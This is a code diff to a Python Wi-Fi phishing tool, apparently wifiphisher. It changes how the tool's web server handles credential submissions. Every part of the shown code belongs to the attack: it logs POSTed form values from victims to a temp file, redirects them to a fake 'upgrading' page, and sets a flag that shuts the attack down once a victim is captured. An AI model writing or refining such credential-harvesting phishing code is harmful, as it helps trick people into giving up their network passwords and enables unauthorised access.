@@ -43,6 +43,7 @@ T = '\033[93m'   # tan
 count = 0  # for channel hopping Thread
 APs = {}  # for listing APs
 hop_daemon_running = True
+terminate = False
 lock = Lock()
 
 
@@ -244,6 +245,8 @@ class HTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
             SimpleHTTPServer.SimpleHTTPRequestHandler.do_GET(self)
 
     def do_POST(self):
+        global terminate
+        redirect = False
         form = cgi.FieldStorage(
             fp=self.rfile,
             headers=self.headers,
@@ -254,7 +257,7 @@ class HTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
             return
         for item in form.list:
             if item.name and item.value and POST_VALUE_PREFIX in item.name:
-                self.redirect("/upgrading.html")
+                redirect = True
                 wifi_webserver_tmp = "/tmp/wifiphisher-webserver.tmp"
                 with open(wifi_webserver_tmp, "a+") as log_file:
                     log_file.write('[' + T + '*' + W + '] ' + O + "POST " +
@@ -263,7 +266,10 @@ class HTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
                                    W + "\n"
                                    )
                     log_file.close()
-                return       
+        if redirect == True:
+            self.redirect("/upgrading.html")
+            terminate = True
+            return
         self.redirect()
 
     def log_message(self, format, *args):
@@ -1069,10 +1075,9 @@ if __name__ == "__main__":
                 lines = ["\n"] * 5
             for l in lines:
                 print l
-                # We got a victim. Shutdown everything.
-                if POST_VALUE_PREFIX in l:
-                    time.sleep(2)
-                    shutdown()
+            if terminate:
+                time.sleep(3)
+                shutdown()
             time.sleep(0.5)
     except KeyboardInterrupt:
         shutdown()
